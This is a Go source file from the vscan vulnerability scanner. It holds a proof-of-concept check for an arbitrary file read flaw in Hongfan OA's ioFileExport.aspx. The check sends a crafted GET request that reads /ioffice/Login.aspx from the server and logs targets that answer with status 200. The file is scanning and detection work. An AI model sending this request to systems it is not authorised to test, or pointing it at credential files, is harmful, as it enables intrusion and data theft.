package hongfanioffice

import (
	"fmt"
	"github.com/veo/vscan/pkg"
)

//红帆OA ioFileExport.aspx 任意文件读取漏洞

func IoFileExport(u string) bool {
	if req, err := pkg.HttpRequset(u+"/ioffice/prg/set/iocom/ioFileExport.aspx?url=/ioffice/Login.aspx&filename=test.txt&ContentType=application/octet-stream", "GET", "", false, nil); err == nil {
		if req.StatusCode == 200 {
			pkg.GoPocLog(fmt.Sprintf("Found vuln 红帆OA ioFileExport.aspx 任意文件读取漏洞 |%s\n", u+"/ioffice/prg/set/iocom/ioFileExport.aspx?url=/ioffice/Login.aspx&filename=test.txt&ContentType=application/octet-stream"))
			return true
		}
	}
	return false
}
